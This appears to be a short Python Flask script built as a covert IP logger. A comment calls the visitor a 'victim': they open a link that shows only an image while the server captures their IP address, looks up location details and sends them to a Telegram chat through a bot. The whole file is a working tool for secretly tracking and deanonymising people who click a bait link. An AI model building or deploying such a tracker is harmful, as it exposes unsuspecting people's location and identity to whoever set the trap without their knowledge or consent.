from flask import Flask, request
from ipAPI import getInfo
from config import *
import requests


app = Flask(__name__)


### TODO: Victim open this url with get-parameters 'memid' - this ChatId on telegram
#       flask get his Ip, send api to get info about him
#       and send info to telegramm with chatId
#
#
#

def sendJson(chat_id, answer):
    messageUrl = "https://api.telegram.org/bot{0}/sendMessage?chat_id={1}&text={2}".format(TOKEN, chat_id, answer)
    requests.get(messageUrl)


@app.route("/")
def hello():
    return "Hello"


@app.route("/memStorage", methods=["GET"])
def memStorage():
    chat_id = request.args.get('memId')
    userIp = request.remote_addr

    returned_text = ""
    # returned_text += "<H1>{0}</H1>".format(chat_id)
    # returned_text += userIp
    returned_text += '<img src="/static/2a.jpg"/>'

    allJson = getInfo(userIp)
    # returned_text+= str(allJson)
    print allJson
    sendJson(chat_id, str(allJson))

    return (returned_text)

if __name__ == '__main__':
    app.run(host=serverIP, port=serverPORT)








